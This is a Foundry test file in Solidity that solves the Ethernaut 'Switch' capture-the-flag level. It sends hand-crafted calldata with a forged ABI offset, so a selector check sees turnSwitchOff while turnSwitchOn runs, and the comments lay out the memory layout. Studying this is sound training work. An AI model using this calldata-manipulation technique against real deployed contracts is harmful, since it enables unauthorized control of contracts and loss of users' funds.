// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/29-Switch/SwitchFactory.sol";

contract SwitchTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testSwitchHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        SwitchFactory switchFactory = new SwitchFactory();
        ethernaut.registerLevel(switchFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(switchFactory);
        Switch ethernautSwitch = Switch(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // 30c13ade -> flipSwitch function signature
        // Memory layout
        // slot 0 (00-1f): 0000000000000000000000000000000000000000000000000000000000000060 -> offset in memory
        // slot 1 (20-3f): 0000000000000000000000000000000000000000000000000000000000000000
        // slot 2 (40-5f): 20606e1500000000000000000000000000000000000000000000000000000000 -> for the purpose of passing onlyOff modifier
        // slot 3 (60-7f): 0000000000000000000000000000000000000000000000000000000000000004 -> length of data
        // slot 4 (80-9f): 76227e1200000000000000000000000000000000000000000000000000000000 -> data (only first 4 bytes), that is `turnSwitchOn` function signature
        
        emit log_named_string("switchOn variable before exploit", ethernautSwitch.switchOn() ? "true" : "false");
        (bool res,) = levelAddress.call(hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e12");
        require(res == true, "low level call failed");
        emit log_named_string("switchOn variable after exploit", ethernautSwitch.switchOn() ? "true" : "false");

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}